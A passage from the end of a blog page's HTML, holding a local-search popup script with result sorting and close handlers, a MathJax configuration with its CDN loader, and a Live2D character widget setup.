        } else if (resultItems.length === 0) {
          resultContent.innerHTML = '<div id="no-result"></div>'
        } else {
          resultItems.sort(function (resultLeft, resultRight) {
            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
              return resultRight.searchTextCount - resultLeft.searchTextCount;
            } else if (resultLeft.hitCount !== resultRight.hitCount) {
              return resultRight.hitCount - resultLeft.hitCount;
            } else {
              return resultRight.id - resultLeft.id;
            }
          });
          var searchResultList = '<div class=\"search-result-list\">';
          resultItems.forEach(function (result) {
            searchResultList += result.item;
          })
          searchResultList += "</div>";
          resultContent.innerHTML = searchResultList;
        }
      }
      if ('auto' === 'auto') {
        input.addEventListener('input', inputEventFunction);
      } else {
        $('.search-icon').click(inputEventFunction);
        input.addEventListener('keypress', function (event) {
          if (event.keyCode === 13) {
            inputEventFunction();
          }
        });
      }
      // remove loading animation
      $('body').css('overflow', '');
      proceedsearch();
    }
    // handle and trigger popup window;
    $('.popup-trigger').click(function (e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc('local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });
    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function (e) {
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 && $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });

    document.addEventListener('mouseup', (e) => {
      var _con = document.querySelector(".local-search-content");
      if (_con) {
        if (!_con.contains(e.target)) {
          onPopupClose();
        }
      }
    });
  </script>


		
	<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haru02.model.json"},"display":{"position":"right","width":225,"height":225,"right":125},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
